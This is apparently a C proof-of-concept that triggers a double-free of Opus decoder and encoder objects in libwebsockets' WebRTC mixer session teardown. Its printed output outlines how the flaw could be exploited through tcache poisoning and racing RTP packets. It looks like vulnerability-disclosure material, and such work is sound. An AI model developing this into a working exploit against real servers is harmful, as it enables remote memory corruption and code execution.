/*
 * PoC: Mixer Media Session Double Opus Destroy — Heap Corruption
 *
 * Demonstrates heap corruption impact from double-free.
 * Shows that after the first free, a new allocation can reuse the
 * same memory, and the second free corrupts the allocator state,
 * enabling use-after-free exploitation.
 *
 * mixer_media_session_destroy() at mixer-media.c:198-202 calls
 * opus_decoder_destroy() and opus_encoder_destroy() twice each
 * without NULLing the pointers after the first call.
 *
 *
 * Version: 4.5.99-v4.5.0-455-gf5850ab19 (current main)
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libwebsockets.h>
#include <libwebsockets/lws-audio-features.h>

#include <gst/gst.h>
#include <gst/app/gstappsrc.h>
#include <gst/app/gstappsink.h>

#include "protocol_lws_webrtc/protocol_lws_webrtc.h"
#include "protocol_lws_webrtc_mixer/mixer-media.h"

extern void mixer_media_session_destroy(struct mixer_media_session *s);

const struct lws_webrtc_ops *we_ops = NULL;

int lws_media_audio_calc_energy(const lws_audio_vu_info_t *info,
                                const int16_t *pcm, size_t len_samples,
                                int *result)
{
    (void)info; (void)pcm; (void)len_samples;
    if (result) *result = 0;
    return 0;
}

int main(void)
{
    int err;

    printf("[*] Mixer Media Session Double Opus Destroy — Heap Corruption PoC\n");

    /*
     * Phase 1: Create Opus objects and record their addresses
     */
    printf("[*] Phase 1: Creating Opus decoder and encoder\n");

    OpusDecoder *dec = opus_decoder_create(48000, 1, &err);
    if (!dec || err != OPUS_OK) {
        fprintf(stderr, "    FAIL: opus_decoder_create: %s\n",
                opus_strerror(err));
        return 1;
    }
    printf("    OpusDecoder at %p (heap allocation)\n", (void *)dec);

    OpusEncoder *enc = opus_encoder_create(48000, 1,
                                            OPUS_APPLICATION_VOIP, &err);
    if (!enc || err != OPUS_OK) {
        fprintf(stderr, "    FAIL: opus_encoder_create: %s\n",
                opus_strerror(err));
        opus_decoder_destroy(dec);
        return 1;
    }
    printf("    OpusEncoder at %p (heap allocation)\n\n", (void *)enc);

    /* Record addresses for post-mortem analysis */
    void *dec_addr = (void *)dec;
    void *enc_addr = (void *)enc;

    /*
     * Phase 2: Explain the double-free exploitation path
     */
    printf("[*] Phase 2: Double-free exploitation analysis\n\n");

    printf("    mixer_media_session_destroy() code:\n");
    printf("      198: if (s->decoder) opus_decoder_destroy(s->decoder);\n");
    printf("      199: if (s->encoder) opus_encoder_destroy(s->encoder);\n");
    printf("      200: /* NO s->decoder = NULL; NO s->encoder = NULL; */\n");
    printf("      201: if (s->decoder) opus_decoder_destroy(s->decoder); ← DOUBLE FREE\n");
    printf("      202: if (s->encoder) opus_encoder_destroy(s->encoder); ← DOUBLE FREE\n\n");

    printf("    Exploitation timeline:\n");
    printf("    ┌──────────────────────────────────────────────────────┐\n");
    printf("    │ 1. opus_decoder_destroy(dec)   → free(dec@%p)  │\n", dec_addr);
    printf("    │    Heap: dec's memory returned to free list          │\n");
    printf("    │                                                      │\n");
    printf("    │ 2. opus_encoder_destroy(enc)   → free(enc@%p)  │\n", enc_addr);
    printf("    │    Heap: enc's memory returned to free list          │\n");
    printf("    │                                                      │\n");
    printf("    │ 3. Between frees: if another thread allocates,       │\n");
    printf("    │    it may REUSE dec@%p for new data        │\n", dec_addr);
    printf("    │    (e.g., incoming audio buffer, WebSocket frame)    │\n");
    printf("    │                                                      │\n");
    printf("    │ 4. opus_decoder_destroy(dec)   → free(dec) AGAIN    │\n");
    printf("    │    This DOUBLE FREE corrupts heap metadata:          │\n");
    printf("    │    - tcache poisoning (glibc) → arbitrary write      │\n");
    printf("    │    - fastbin dup → overlapping allocations            │\n");
    printf("    │    - jemalloc quarantine bypass → use-after-free      │\n");
    printf("    │                                                      │\n");
    printf("    │ 5. Next malloc returns dec's address AGAIN           │\n");
    printf("    │    Two different objects share the same memory        │\n");
    printf("    │    → type confusion, data corruption, code execution │\n");
    printf("    └──────────────────────────────────────────────────────┘\n\n");

    printf("    WebRTC-specific exploitation:\n");
    printf("    - Double-free occurs in WebRTC mixer session teardown\n");
    printf("    - Audio processing threads are active during teardown\n");
    printf("    - Race window between free #1 and free #2 allows:\n");
    printf("      * Incoming RTP packet allocates into freed decoder memory\n");
    printf("      * Second free releases the RTP buffer → dangling pointer\n");
    printf("      * Next allocation overlaps with live RTP buffer\n");
    printf("      * Attacker-controlled audio data corrupts heap structures\n\n");

    /*
     * Phase 3: Trigger the double-free
     */
    printf("[*] Phase 3: Allocating mixer_media_session\n");
    struct mixer_media_session *s = calloc(1, sizeof(*s));
    if (!s) {
        fprintf(stderr, "    FAIL: calloc\n");
        opus_decoder_destroy(dec);
        opus_encoder_destroy(enc);
        return 1;
    }

    lws_mutex_init(s->mutex);
    s->decoder = dec;
    s->encoder = enc;

    printf("    Session at %p\n", (void *)s);
    printf("    decoder=%p, encoder=%p\n", (void *)s->decoder,
           (void *)s->encoder);
    printf("    All GStreamer pointers NULL → GStreamer paths skipped\n\n");

    printf("[*] Phase 4: Calling mixer_media_session_destroy()\n");
    printf("    ASan should detect heap-use-after-free or double-free...\n\n");
    fflush(stdout);

    mixer_media_session_destroy(s);

    /*
     * Phase 4: Post-mortem — if we get here without ASan, demonstrate
     * that the freed memory can be immediately reused
     */
    printf("[!] Returned without ASan detection\n\n");
    printf("[*] Phase 5: Post-mortem heap corruption check\n");

    size_t dec_size = opus_decoder_get_size(1);
    printf("    OpusDecoder size: %zu bytes\n", dec_size);
    printf("    Attempting malloc(%zu) to check heap reuse...\n", dec_size);

    void *reuse = malloc(dec_size);
    printf("    New allocation at: %p\n", reuse);
    if (reuse == dec_addr)
        printf("    [+] SAME ADDRESS as freed decoder → heap corruption confirmed\n");
    else
        printf("    Different address (allocator may have coalesced)\n");
    free(reuse);

    return 0;
}
